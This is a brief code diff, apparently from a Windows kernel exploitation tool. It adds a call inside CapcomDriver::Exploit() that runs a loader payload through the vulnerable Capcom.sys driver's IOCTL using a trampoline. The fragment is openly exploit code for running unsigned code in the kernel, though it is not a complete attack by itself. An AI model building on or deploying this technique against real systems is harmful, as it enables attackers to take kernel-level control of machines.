@@ -53,6 +53,9 @@ void CapcomDriver::Exploit()
 
 	Util::Debug::Print("Mapped Capcom.sys to: %p\n", PayloadImage);
 	Util::Debug::Print("EntryPointRVA: %p\n", PayloadEntryRVA);
+
+	ExecIoCtlWithTrampoline(CapcomDriver::LoaderPayload);
+
 }
 
 const std::wstring & CapcomDriver::GetVulnDriverName()
